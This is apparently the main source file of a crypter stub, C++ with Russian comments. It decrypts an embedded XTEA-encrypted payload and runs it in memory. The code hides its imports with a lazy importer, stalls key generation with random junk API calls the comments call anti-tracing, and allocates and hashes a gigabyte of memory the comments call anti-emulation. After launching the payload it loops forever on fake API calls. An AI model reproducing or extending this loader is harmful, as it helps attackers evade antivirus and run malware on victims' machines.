#include "pch.h"
#include <iostream>
#include <stdio.h>
#include <string.h>
#include "../../modules/modules.h"
#include "../../modules/trash_gen_module/fake_api.h"
#include "../../modules/data_protect.h"
#include "../../modules/lazy_importer/lazy_importer.hpp"
#include "../../modules/data_crypt_string.h"

#define SIZE_FILE 50*1024*1024
#define SLEEP_KEYGEN 50
#define MEMORY_MALLOC 1*1024*1024*1024

uint8_t *tmp_data = NULL;

/*
Функция генерирует пароль для расшифроки, по следующему алгоритму:

Генерируется массив случаных чисел от 0 до 9, далее генерируется хеш в качестве ключа, хеш генерируется на основе числа, 
сгенерированного при создании зашифрованного массива защищаемого файла.

Далее сортируется массив от 0 до 9, т.е. в итоге у нас получается хеши от числел 0-9. Отсортированные по порядку.

Параметры:

uint32_t pass[10] - Полученный пароль для расшифровки.
*/
static void pass_gen(uint32_t pass[10]) {

	uint32_t flag_found = 0;
	uint32_t count = 0;
	uint32_t i = 0;

	//Получаем рандомное число для соли murmurhash
	uint32_t eax_rand = 0;

	//Получение четырехбайтного значения eax_random
	memcpy(&eax_rand, data_protect, sizeof(int));

	printf("#");

	//Получаем массив, случайных числел от 1 до 10
	//Будет делаться случайно, плюс для антитрассировки будут вызываться случайно ассемблерные инструкции и API.
	while (1) {
		if (count == 10) break;
		uint32_t eax_random = do_Random_EAX(25, 50);
		uint32_t random = fake_api_instruction_gen(eax_random + 1, SLEEP_KEYGEN);

		if (pass[count] == random) {
			flag_found = 1;
			count++;
		}

		if (flag_found != 1) {
			if (count == random) {
				pass[count] = Murmur3(&random, sizeof(int), eax_rand);
				flag_found = 0;
				count++;
			}
		}
	}

	printf("#");

}

int main()
{
	static uint32_t passw[10];
	memset(passw, 0xff, sizeof(passw));
	pass_gen(passw);

	str_to_decrypt(kernel32, 13, &MAGIC, 4);
	auto base = reinterpret_cast<std::uintptr_t>(LI_FIND(LoadLibraryA)(kernel32));
	

	//Получение имени самого себя
	wchar_t sfp[1024];
	LI_GET(base, GetModuleFileNameA)(0, LPSTR(sfp), 1024);
	
	//Получение четырехбайтного значения size_file
	uint32_t size_file = 0;
	memcpy(&size_file, data_protect+4, sizeof(int));
	XTEA_decrypt((uint8_t*)(data_protect + 8), size_file, passw, sizeof(passw));

	//Приведение типов:
	char* Putch_Char = (char*)sfp;

	printf("#");

	/*Антиэмуляция:
		Выделение памяти размером MEMORY_MALLOC (Один гигабайт), потом подсчет хеша этого куска памяти, шифровка/расшифровка этого куска памяти, в качестве ключа наш хеш.
	*/
	
	tmp_data = (uint8_t*)malloc(MEMORY_MALLOC);
	if (tmp_data == NULL) {
		printf("No free mem \n");
		while (1);
	}
	else {
		memset(tmp_data, 0xFF, MEMORY_MALLOC);
	}

	memcpy((uint8_t*)tmp_data, (uint8_t*)data_protect, size_file);

	uint32_t hash = Murmur3(tmp_data, MEMORY_MALLOC, 10);
	XTEA_encrypt((uint8_t*)(tmp_data), size_file, &hash, sizeof(hash));
	XTEA_decrypt((uint8_t*)(tmp_data), size_file, &hash, sizeof(hash));

	memcpy((uint8_t*)data_protect, (uint8_t*)tmp_data, size_file);
	
	//Антиэмуляция

	printf("#");

	//Запуск данных в памяти
	run(base, Putch_Char, data_protect + 8);

	free(tmp_data);

	//Программа не завершает работу, а иммитирует действия из случайных инструкций и вызова API в случайном порядке.
	//Возможно лучше завершать, а может и нет.)))
	uint32_t random = 1;
	while (1) {
		uint32_t eax_random = do_Random_EAX(random, 50);
		random = fake_api_instruction_gen(eax_random + 1, random);
		random++;
	}

	return 0;
}
